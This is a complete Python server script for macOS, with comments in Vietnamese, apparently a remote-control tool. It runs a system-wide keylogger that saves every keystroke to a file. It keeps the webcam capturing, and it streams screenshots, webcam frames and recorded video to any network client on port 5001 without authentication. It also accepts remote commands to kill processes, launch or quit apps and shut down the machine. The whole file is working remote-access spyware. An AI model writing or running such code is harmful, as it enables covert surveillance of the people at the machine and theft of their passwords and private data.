import socket
import subprocess
import threading
import time
import os
from datetime import datetime
import cv2
import json
import struct 
from PIL import ImageGrab
import io
import numpy as np
from pynput import keyboard 

HOST = "0.0.0.0"
PORT = 5001

# --- BIẾN TOÀN CỤC ---
global_cap = None
global_frame = None
camera_lock = threading.Lock()
is_camera_running = True
is_keylogging = False 

# ==========================================
# 1. SỬA HÀM SYSTEM KEYLOGGER
# ==========================================
def on_press(key):
    global is_keylogging
    if not is_keylogging:
        return

    try:
        k = key.char
    except AttributeError:
        # SỬA DÒNG NÀY:
        if key == keyboard.Key.space:
            k = " [SPACE] "  # <--- Đổi thành [SPACE] thay vì khoảng trắng thường
        elif key == keyboard.Key.enter:
            k = " [ENTER]"
        elif key == keyboard.Key.backspace:
            k = " [BS] "
        else:
            k = f" [{str(key).replace('Key.', '')}] "

    try:
        with open("web_keylog.txt", "a") as f:
            # Thêm khoảng cách sau mỗi phím để dễ nhìn (như yêu cầu trước)
            f.write(str(k) + " ")
    except Exception as e:
        print(f"Keylog Error: {e}")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("[INFO] System Keylogger listener ready.")

start_keylogger()

# ==========================================
# (GIỮ NGUYÊN CÁC HÀM CAMERA, APP, SCREENSHOT CŨ)
# ==========================================
def camera_loop():
    global global_cap, global_frame
    cap = cv2.VideoCapture(0)
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
    cap.set(cv2.CAP_PROP_FPS, 30)
    if not cap.isOpened(): return
    global_cap = cap
    while is_camera_running:
        ret, frame = cap.read()
        if ret:
            with camera_lock: global_frame = frame
        else: time.sleep(0.1)
    cap.release()

threading.Thread(target=camera_loop, daemon=True).start()

def scan_installed_apps():
    found_apps = {}
    app_dirs = ["/Applications", "/System/Applications", "/System/Applications/Utilities", os.path.expanduser("~/Applications")]
    for d in app_dirs:
        if not os.path.exists(d): continue
        try:
            for item in os.listdir(d):
                if item.endswith(".app"):
                    app_name = os.path.splitext(item)[0]
                    found_apps[app_name.lower()] = app_name
        except: pass
    return dict(sorted(found_apps.items(), key=lambda item: item[1]))
APPS = scan_installed_apps()

def is_app_running(name):
    try: subprocess.check_output(["pgrep", "-f", name]); return True
    except: return False

def start_app(app_name):
    if is_app_running(app_name): return f"[INFO] {app_name} already running"
    try: subprocess.run(["open", "-a", app_name], check=True); time.sleep(1); return f"[OK] Started {app_name}"
    except Exception as e: return f"[ERROR] {e}"

def stop_app(app_name):
    subprocess.run(["osascript", "-e", f'quit app "{app_name}"']); time.sleep(0.5)
    if not is_app_running(app_name): return f"[OK] Stopped {app_name}"
    subprocess.run(["pkill", "-f", app_name], check=False); return f"[OK] Attempted to stop {app_name}"

def capture_screen_bytes():
    try:
        img = ImageGrab.grab().convert("RGB")
        img.thumbnail((1600, 900))
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='JPEG', quality=80)
        return img_byte_arr.getvalue()
    except: return None

def capture_full_quality_bytes():
    try:
        img = ImageGrab.grab().convert("RGB")
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='JPEG', quality=100)
        return img_byte_arr.getvalue()
    except: return None

def capture_webcam_bytes():
    with camera_lock:
        if global_frame is None: return None
        frame_copy = global_frame.copy()
    try: _, buffer = cv2.imencode('.jpg', frame_copy, [int(cv2.IMWRITE_JPEG_QUALITY), 90]); return buffer.tobytes()
    except: return None

def take_screenshot():
    try:
        os.makedirs("screenshots", exist_ok=True)
        filename = f"screenshots/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        subprocess.run(["screencapture", "-x", filename])
        return f"[OK] Screenshot saved: {filename}"
    except Exception as e: return f"[ERROR] {e}"

def record_webcam(seconds):
    out = None
    try:
        os.makedirs("recordings", exist_ok=True)
        filename = f"recordings/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        with camera_lock:
            if global_frame is None: return None
            height, width, _ = global_frame.shape
        out = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'avc1'), 30.0, (width, height))
        start_time = time.time()
        while (time.time() - start_time) < seconds:
            with camera_lock:
                if global_frame is not None: out.write(global_frame)
            time.sleep(0.033)
        return filename
    except Exception as e: print(e); return None
    finally:
        if out: out.release()

def send_image_data(conn, img_bytes):
    if img_bytes is None: conn.sendall(struct.pack(">L", 0)); return
    conn.sendall(struct.pack(">L", len(img_bytes))); conn.sendall(img_bytes)

def shutdown_machine(): subprocess.Popen(["sudo", "shutdown", "-h", "now"]); return "[OK] Shutdown sent"
def restart_machine(): subprocess.Popen(["sudo", "shutdown", "-r", "now"]); return "[OK] Restart sent"
def get_process_list():
    try:
        # ps -e (tất cả process), -o (output format), --sort=-%cpu (sắp xếp giảm dần cpu)
        # Lưu ý: Lệnh ps trên macOS khác Linux một chút.
        # Trên macOS: ps -Aceo pid,pcpu,comm -r (Option -r là sort by CPU usage)
        cmd = "ps -Aceo pid,pcpu,comm -r | head -n 20" 
        output = subprocess.check_output(cmd, shell=True, text=True)
        return output
    except Exception as e:
        return f"[ERROR] {e}"

def kill_process(pid):
    try:
        # Gửi tín hiệu SIGTERM (15) trước để tắt nhẹ nhàng
        subprocess.run(["kill", str(pid)], check=True)
        return f"[OK] Killed PID {pid}"
    except:
        try:
            # Nếu không được thì dùng SIGKILL (9) - Bắt buộc tắt
            subprocess.run(["kill", "-9", str(pid)], check=True)
            return f"[OK] Force Killed PID {pid}"
        except Exception as e:
            return f"[ERROR] Failed to kill {pid}: {e}"

def handle_client(conn, addr):
    global is_keylogging
    try:
        data = conn.recv(4096).decode().strip()
        if not data: return
        parts = data.split()
        command = parts[0].lower()

        if command == "disconnect": return
        elif command == "keylog_start": is_keylogging = True; conn.sendall(b"[OK] Started"); return
        elif command == "keylog_stop": is_keylogging = False; conn.sendall(b"[OK] Stopped"); return
        elif command == "keylog_clear": 
            with open("web_keylog.txt", "w") as f: f.write("")
            conn.sendall(b"[OK] Cleared"); return
            
        # ==========================================
        # 2. SỬA WEB KEYLOGGER
        # ==========================================
        elif command == "keylog_web":
             # Chỉ ghi khi đang bật chế độ Record
             if is_keylogging:
                 key_char = parts[1] if len(parts)>1 else ""
                 
                 # Giải mã [SPACE] thành dấu cách thật
                 if key_char == "[SPACE]": key_char = " "
                 
                 with open("web_keylog.txt", "a") as f: 
                     # SỬA: Dùng " " thay vì "\n"
                     f.write(key_char + " ") 
                     
             conn.sendall(b"OK"); return
        # ==========================================

        elif command == "screen_stream": send_image_data(conn, capture_screen_bytes()); return
        elif command == "download_screenshot": send_image_data(conn, capture_full_quality_bytes()); return
        elif command == "webcam_stream": send_image_data(conn, capture_webcam_bytes()); return
        elif command == "screenshot": conn.sendall(take_screenshot().encode())
        elif command == "shutdown": conn.sendall(shutdown_machine().encode())
        elif command == "restart": conn.sendall(restart_machine().encode())
        elif command == "list_processes": conn.sendall(get_process_list().encode())
        elif command == "kill_process":
            if len(parts) < 2:
                result = "[ERROR] Missing PID"
            else:
                pid = parts[1]
                if pid.isdigit():
                    result = kill_process(pid)
                else:
                    result = "[ERROR] Invalid PID"
            conn.sendall(result.encode())
            return
        elif command == "terminate_server":
            conn.sendall(b"[OK] Server script stopping...")
            # Tạo luồng riêng để tắt sau 1s (để kịp gửi phản hồi về client)
            def kill_me():
                time.sleep(1)
                os._exit(0) # Thoát ngay lập tức
            threading.Thread(target=kill_me).start()
            return
        elif command == "list_apps": conn.sendall(json.dumps({k: {"name": v, "running": is_app_running(v)} for k, v in APPS.items()}).encode())
        elif command in ("start", "stop") and len(parts) >= 2:
             key = " ".join(parts[1:]).lower(); name = APPS.get(key, " ".join(parts[1:]))
             conn.sendall((start_app(name) if command == "start" else stop_app(name)).encode())
        elif command == "webcam_record" and len(parts) >= 2:
             video_path = record_webcam(int(parts[1]))
             if video_path and os.path.exists(video_path):
                 with open(video_path, "rb") as f: send_image_data(conn, f.read())
                 try: os.remove(video_path) 
                 except: pass
             else: send_image_data(conn, None)
             return
        elif command == "keylog_data":
             try:
                with open("web_keylog.txt", "r") as f: result=f.read()
             except: result=""
             conn.sendall(result.encode()); return
        else: conn.sendall(b"[ERROR] Unknown")
    except: pass
    finally: conn.close()

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()
        print(f"Server on {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__": start_server()